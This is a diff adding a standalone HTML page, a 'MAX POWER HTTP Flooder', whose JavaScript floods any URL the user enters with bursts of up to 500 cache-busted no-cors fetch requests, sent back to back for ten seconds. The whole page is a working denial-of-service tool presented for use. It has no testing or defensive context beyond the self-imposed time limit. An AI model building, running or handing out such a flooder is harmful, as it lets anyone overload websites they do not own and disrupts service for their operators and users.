@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>MAX POWER HTTP Flooder (10s limit)</title>
+<style>
+  body {
+    background: #111;
+    color: #0f0;
+    font-family: monospace;
+    padding: 1rem;
+  }
+  input, button {
+    font-size: 1.2rem;
+    margin: 0.5rem 0;
+    padding: 0.5rem;
+    border-radius: 5px;
+    border: none;
+    outline: none;
+    font-family: monospace;
+  }
+  input {
+    width: 320px;
+    background: #222;
+    color: #0f0;
+  }
+  button {
+    background: #0f0;
+    color: #000;
+    cursor: pointer;
+  }
+  button:disabled {
+    background: #444;
+    color: #666;
+    cursor: not-allowed;
+  }
+  #log {
+    margin-top: 1rem;
+    height: 300px;
+    background: #000;
+    border: 2px solid #0f0;
+    padding: 1rem;
+    overflow-y: auto;
+    white-space: pre-wrap;
+  }
+</style>
+</head>
+<body>
+<h1>MAX POWER HTTP Flooder (10s limit)</h1>
+<input type="text" id="target" placeholder="Enter target URL (e.g. https://example.com)" />
+<br />
+<label>Requests per burst: <input type="number" id="burstCount" value="100" min="1" max="500" /></label>
+<br />
+<button id="startBtn">Start Flood</button>
+<button id="stopBtn" disabled>Stop Flood</button>
+
+<pre id="log"></pre>
+
+<script>
+  const targetInput = document.getElementById('target');
+  const burstCountInput = document.getElementById('burstCount');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+  const log = document.getElementById('log');
+
+  let flooding = false;
+  let endTime = 0;
+  let floodTimeout = null;
+
+  function logMsg(msg) {
+    const time = new Date().toLocaleTimeString();
+    log.textContent += `[${time}] ${msg}\n`;
+    log.scrollTop = log.scrollHeight;
+  }
+
+  async function sendRequest(url) {
+    try {
+      await fetch(url, { mode: 'no-cors', cache: 'no-store' });
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  async function floodBurst() {
+    if (!flooding) return;
+
+    if (Date.now() >= endTime) {
+      stopFlood();
+      return;
+    }
+
+    const target = targetInput.value.trim();
+    if (!target) {
+      alert('Enter a valid URL!');
+      stopFlood();
+      return;
+    }
+
+    const burstCount = Math.min(Math.max(parseInt(burstCountInput.value, 10), 1), 500);
+
+    const requests = [];
+    for (let i = 0; i < burstCount; i++) {
+      const url = `${target}?cachebust=${Date.now()}_${Math.random()}`;
+      requests.push(sendRequest(url));
+    }
+
+    const results = await Promise.all(requests);
+    const success = results.filter(r => r).length;
+    const fail = results.length - success;
+
+    logMsg(`Burst sent: ${requests.length} requests | Success: ${success} | Fail: ${fail}`);
+
+    // Immediately start next burst (max speed)
+    floodTimeout = setTimeout(floodBurst, 0);
+  }
+
+  function startFlood() {
+    flooding = true;
+    endTime = Date.now() + 10 * 1000; // 10 seconds flood limit
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    log.textContent = '';
+    logMsg('Flood started — max power, 10 seconds max');
+    floodBurst();
+  }
+
+  function stopFlood() {
+    flooding = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    if (floodTimeout) clearTimeout(floodTimeout);
+    logMsg('Flood stopped');
+  }
+
+  startBtn.addEventListener('click', startFlood);
+  stopBtn.addEventListener('click', stopFlood);
+</script>
+</body>
+</html>
